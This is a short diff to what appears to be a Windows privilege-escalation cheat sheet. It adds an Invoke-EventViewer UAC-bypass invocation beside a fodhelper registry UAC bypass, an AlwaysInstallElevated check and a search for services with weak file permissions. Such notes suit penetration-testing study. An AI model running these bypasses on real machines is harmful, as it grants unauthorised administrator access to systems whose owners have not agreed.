@@ -23,6 +23,11 @@ reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
 4. REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
 5. run fodhelper.exe, whoami /groups
 ```
+
+```
+Import-Module .\Invoke-EventViewer.ps1
+Invoke-EventViewer cmd.exe
+```
 ##### Insecure File Permissions
 ```
 1. Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'} # look for services with path in Program Files
